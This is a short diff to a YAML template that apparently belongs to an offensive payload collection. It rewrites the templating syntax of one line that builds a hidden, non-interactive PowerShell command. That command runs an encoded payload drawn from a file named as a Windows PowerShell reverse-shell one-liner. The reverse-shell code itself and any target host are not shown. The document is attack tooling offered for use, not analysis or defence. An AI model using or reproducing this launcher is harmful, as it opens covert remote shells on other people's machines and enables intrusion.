@@ -6,4 +6,4 @@ metadata:
   author: "Unknown"
 
 content: |
-  powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand <% echo $(esh payloads/revshell-windows-powershell-oneliner) | python helper_scripts/encode.py --base64pwsh %>
+  powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand {{ include('payloads/revshell-windows-powershell-oneliner.yaml') | base64_pwsh }}
